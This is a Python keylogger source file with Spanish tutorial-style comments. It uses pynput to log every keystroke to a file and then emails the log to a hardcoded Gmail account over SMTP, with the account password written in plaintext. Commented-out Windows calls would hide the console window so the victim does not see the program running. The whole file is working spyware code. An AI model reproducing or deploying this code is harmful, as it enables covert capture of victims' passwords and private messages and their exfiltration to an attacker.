#! /usr/bin/env python3
#_*_coding: utf8_*_

import pynput.keyboard
import smtplib
import time
import sys
#import py2exe
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from tqdm import tqdm
#import win32console
#import win32gui

def main():

    #ventana = win32console.GetConsoleWindow() # NOTE: Al momento de ejecutar esta funcion, se obtienen propiedades, valores y funciones de la ventana que esté ejecutando el programa
    #win32gui.ShowWindow(ventana,0) # NOTE: Recibe 2 parametros, el primero sera la ventana que se va a ocultar, el proceso principa.
    # NOTE: Como segundo parametro es un número logico para que el progreso no se muestre en pantalla durante ese tiempo pero que si se et+e ejecutnado el programa
    log_file = open('log.txt','w+')

    def enviar_datos():
        msg = MIMEMultipart()
        password = ('zS06x2SmZwTbP8v')
        msg['From'] = 'yozhacking@gmail.com' #From es el usuario que está enviando el archivo
        msg['To'] = 'yozhacking@gmail.com' #To es el destinarario que en este caso somos nosotros mismos
        msg['Subject'] = 'KEYLOGGER PRUEBA' #Asunto, no es necesario.
        msg.attach(MIMEText(open('log.txt').read())) # NOTE: Adjuntar el archivo que contiene los registros de las palabras escritas
        # NOTE: Con la funcion open podremos adjuntar el archivo a enviar y aparte, leer su contenido.
        # NOTE: Con la funcion read, aparte de leer el archivo que se encuentra en la funcion open(file) y a a la vez se atribuye a la funcion MIMEText
        # NOTE: Con eso todo el archivo esta leido y se adjunta al objeto msg para poder enviarlo

        try:
            server = smtplib.SMTP('smtp.gmail.com:587') # NOTE: SMTP es una funciona de smtplib la cual nos permite definir el servidor de correo electronico y a su vez el puerto al que se debe de conectar
            # NOTE: smtp.gmail.com es el servidor de correo de gmail y el puerto es el asociado por muchas ISP para la recepción de mensajes seguros.
            server.starttls() # NOTE: tls = Transport Layer Security
            server.login(msg['From'], password)
            server.sendmail(msg['From'], msg['To'], msg.as_string()) # NOTE: Sendmail función recibe 3 parametros, el remitente, el destinatario y el contenido del correo
            # NOTE: msg.as_string envia el contenido del correo que en este caso ya tiene un valor previamente asignado con attach
            server.quit() # NOTE: Una vez que se envíe el archivo de texto, la comunicación con el servidor y la sesióon se cierran

        except:
            pass

    def imprimir():
        teclas = ''.join(lista_teclas)
        log_file.write(teclas)
        log_file.write('\n')
        log_file.close()
        time.sleep(3)
        for x in 'Enviando datos':
            print(x, end="")
            sys.stdout.flush()
            time.sleep(0.2)
        for x in tqdm(range(10)): #Algoritmo para crear barra de carga
            time.sleep(0.2)
        time.sleep(1)
        print("""<-- DATOS ENVIADOS -->""")
        enviar_datos()

    lista_teclas = []

    def convertir(key):
        if isinstance(key, pynput.keyboard.KeyCode):
            return key.char
        else:
            return str(key)

    def presiona(key):
        key1 = convertir(key)
        if key1 == 'Key.esc':

            print('Salida manual ejecutada')
            imprimir()
            return False

        elif key1 == 'Key.space':
            lista_teclas.append(" ")

        elif key1 == 'Key.backspace':
            lista_teclas.append('<-')

        elif key1 == 'Key.shift_r':
            pass

        elif key1 == 'Key.enter':
            lista_teclas.append('\n')

        elif key1 == 'Key.tab':
            pass

        elif key1 == 'Key.caps_lock':
            lista_teclas.append('CLICK IZQ')

        else:
            lista_teclas.append(key1)

    with pynput.keyboard.Listener(on_press=presiona) as listen:
        listen.join()


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print('Saliendo')
        exit()
